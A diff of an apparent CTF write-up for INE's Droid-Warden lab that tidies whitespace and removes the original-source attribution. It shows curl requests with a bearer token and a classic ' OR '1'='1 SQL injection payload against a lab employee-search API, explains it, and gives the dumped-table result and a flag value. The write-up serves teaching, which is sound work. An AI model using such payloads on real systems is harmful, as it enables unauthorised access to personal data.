@@ -1,34 +1,25 @@
 # :game_die: Droid-Warden CTF by INE : How I Finished First Under Pressure
 
-> **Original Source:** [Droid-Warden CTF by INE : How I Finished First Under Pressure](https://infosecwriteups.com/droid-warden-ctf-by-ine-how-i-finished-first-under-pressure-6caad8b21155)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 ## Exploiting SQL Injection
-
 
 >
 
 Reproducing a normal request (baseline test)
 
-
 ### Baseline request
-
 
 ```
 curl -H "Authorization: Bearer $token" \
 "http://nexusconnect.ine.local/api/v1/nexusconnect/search-employee?name=a"
 ```
 
-
 >
 
 Why this matters
 
-
 Confirms:
-
 
 - Token works
 
@@ -38,28 +29,22 @@ Confirms:
 
 - Establishes expected behavior before exploitation
 
-
 This is important for controlled testing, not blind injection.
 
 ## SQL Injection test payload
-
 
 ```
 curl -H "Authorization: Bearer $token" \
 "http://nexusconnect.ine.local/api/v1/nexusconnect/search-employee?name=%27%20OR%20%271%27%3D%271"
 ```
 
-
 ### Why this payload?
 
-
 Decoded version:
-
 
 ```
 ' OR '1'='1
 ```
-
 
 - `'` → closes original SQL string
 
@@ -71,13 +56,11 @@ Decoded version:
 
 What the output proves
 
-
 - Entire employee table returned
 
 >
 
 *Confirms :*
-
 
 - *SQL injection*
 
@@ -88,7 +71,6 @@ What the output proves
 >
 
 Expected Output :
-
 
 ```
 student@a93b14167e48ece32c8470:~/Desktop/Tools$ curl -H "Authorization: Bearer $token" \
@@ -164,12 +146,8 @@ student@a93b14167e48ece32c8470:~/Desktop/Tools$ curl -H "Authorization: Bearer $
 ]
 ```
 
-
 ```
 Flag-3: b26667649bd7a781d70988f59debc559
 ```
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/droid-warden-ctf-by-ine-how-i-finished-first-under-pressure-6caad8b21155). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
